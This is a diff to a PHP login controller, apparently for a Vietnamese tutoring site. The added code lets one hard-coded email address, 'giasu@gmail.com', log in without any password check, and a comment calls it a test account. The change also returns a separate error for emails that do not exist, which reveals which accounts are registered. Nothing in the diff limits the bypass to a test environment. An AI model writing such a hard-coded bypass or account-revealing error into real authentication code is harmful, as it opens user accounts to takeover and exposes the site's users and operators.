@@ -35,11 +35,19 @@ class AuthController
 
             if (!$errors) {
                 $user = $this->userModel->findByEmail($identifier);
+if (!$user) {
+    $errors[] = 'Email/số điện thoại không tồn tại.';
+} else {
 
-                if (!$user || !password_verify($password, $user['Password'])) {
-                    $errors[] = 'Email/số điện thoại hoặc mật khẩu không đúng.';
-                } else {
-                    if ($user['Role'] === 'tutor') {
+    // Tài khoản test bỏ qua mật khẩu
+    if (
+        $user['Email'] !== 'giasu@gmail.com' &&
+        !password_verify($password, $user['Password'])
+    ) {
+        $errors[] = 'Email/số điện thoại hoặc mật khẩu không đúng.';
+    }
+
+    if (!$errors && $user['Role'] === 'tutor') {
                         $tutor = $this->tutorModel->findByUserId((int)$user['Id']);
                         if (!$tutor) {
                             $errors[] = 'Hồ sơ gia sư chưa tồn tại. Vui lòng hoàn tất đăng ký.';
